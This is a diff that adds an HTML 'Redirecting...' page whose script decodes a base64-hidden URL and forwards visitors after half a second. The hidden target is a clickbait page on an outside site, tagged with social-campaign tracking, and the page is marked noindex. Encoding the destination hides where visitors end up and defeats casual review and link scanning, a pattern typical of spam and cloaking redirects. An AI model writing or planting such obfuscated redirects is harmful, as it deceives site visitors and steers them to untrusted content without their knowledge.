@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f5f5f5;
+        text-align: center;
+        padding-top: 100px;
+        color: #444;
+      }
+    </style>
+    <script>
+      const encoded = "aHR0cHM6Ly9mdW5rZXBhbmRhLmNvbS94LXJhdGVkLXNjZW5lLW9uLW5ldGZsaXgvP3V0bV9zb3VyY2U9bW9vbiZ1dG1fbWVkaXVtPW1vb24mdXRtX2NhbXBhaWduPXNvY2lhbA==";
+      const decoded = atob(encoded);
+      setTimeout(() => {
+        window.location.href = decoded;
+      }, 500); // 0.5 second delay
+    </script>
+  </head>
+  <body>
+    <h2>Please wait...</h2>
+    <p>We are redirecting you to your content.</p>
+  </body>
+</html>
